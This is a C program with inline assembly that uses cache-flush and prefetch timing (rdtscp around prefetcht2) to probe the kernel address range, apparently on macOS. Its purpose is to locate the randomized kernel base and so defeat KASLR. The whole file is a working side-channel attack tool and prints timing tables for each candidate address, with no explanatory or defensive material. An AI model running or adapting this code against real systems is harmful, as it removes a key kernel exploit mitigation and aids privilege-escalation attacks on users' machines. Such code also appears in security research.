// gcc -o kaslr kaslr.c -Wall -O3
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#define FLUSH_SIZE 0x600000
uint32_t cachesize = FLUSH_SIZE;
volatile uint8_t mem[FLUSH_SIZE];

uint64_t time_page(uint64_t addr);

__asm__
(
    "_time_page:\n"
    "   leaq _mem(%rip), %rcx\n"
    "   movl _cachesize(%rip), %r8d\n"
    "flush:\n"
    "   subl $64, %r8d\n"
    "   movq $0, (%rcx, %r8, 1)\n"
    "   cmp $0, %r8d\n"
    "   jg flush\n"

    "   mfence\n"
    "   rdtscp\n"
    "   movl %eax, %r8d\n"
    "   movl %edx, %r9d\n"
    "   prefetcht2 (%rdi)\n"
    "   rdtscp\n"

    "   subl %r9d, %edx\n"
    "   subl %r8d, %eax\n"
    "   salq $32, %rdx\n"
    "   orq %rdx, %rax\n"
    "   ret\n"
);

int main(void)
{
    uint64_t start  =   0xffffff8000000000,
             end    =   0xffffff8020000000,
             times  =                   16,
#if 1
             step   =             0x100000,
             num    = (end - start) / step;
    uint64_t *res = malloc(num * times * sizeof(*res));
    if(!res)
    {
        return -1;
    }

    for(uint64_t addr = start, i = 0; i < num; ++i, addr += step)
    {
        for(size_t j = 0; j < times; ++j)
        {
            sched_yield();
            res[i * times + j] = time_page(addr);
        }
    }
    for(uint64_t addr = start, i = 0; i < num; ++i, addr += step)
    {
        printf("0x%016llx", addr);
        for(size_t j = 0; j < times; ++j)
        {
            printf(" %6llu", res[i * times + j]);
        }
        printf("\n");
    }
#else
             step   =             0x100000,
             page   =             0x100000,
             num    = (end - start) / step;
    uint64_t *res = malloc(num * sizeof(*res));
    if(!res)
    {
        return -1;
    }

    for(uint64_t addr = start, i = 0; i < num; ++i, addr += step)
    {
        uint64_t n = 0;
        for(uint64_t off = 0; off < step; off += page)
        {
            for(size_t j = 0; j < times; ++j)
            {
                sched_yield();
                uint64_t cycles = time_page(addr + off);
                //n = cycles < n ? cycles : n;
                //n += cycles;
                if(cycles >= 100 && ++n >= times/4)
                {
                    //goto afterloop;
                }
            }
        }
        afterloop:;
        res[i] = n;
        if(i >= 2 && n < times/4 && res[i-1] < times/4 && res[i-2] < times/4)
        {
            res[i+1] = 0xffffffff;
            break;
        }
    }
    for(uint64_t addr = start, i = 0; i < num; ++i, addr += step)
    {
        printf("0x%016llx %8llu\n", addr, res[i]);
    }
#endif

    free(res);
    return 0;
}
